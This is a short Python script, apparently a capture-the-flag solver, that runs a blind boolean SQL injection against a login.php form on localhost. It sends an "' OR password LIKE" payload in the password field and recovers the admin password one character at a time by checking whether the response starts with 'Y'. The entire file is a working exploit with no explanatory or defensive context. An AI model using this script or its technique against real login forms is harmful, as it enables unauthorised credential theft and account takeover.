import string
import requests

url = "http://localhost/login.php"
injection = "' OR password LIKE '{}%"
flag = ""
valid_chars = [x for x in string.printable if x not in ["%", "_"]]
def checkChar(val):
    payload = {"username": "admin", "password": injection.format(flag + val)}
    r = requests.post(url, data=payload)
    return r.text[0] == "Y"


while True:
    for i in valid_chars:
        valid = checkChar(i)
        if(valid):
            flag += i
            break
    print(flag)


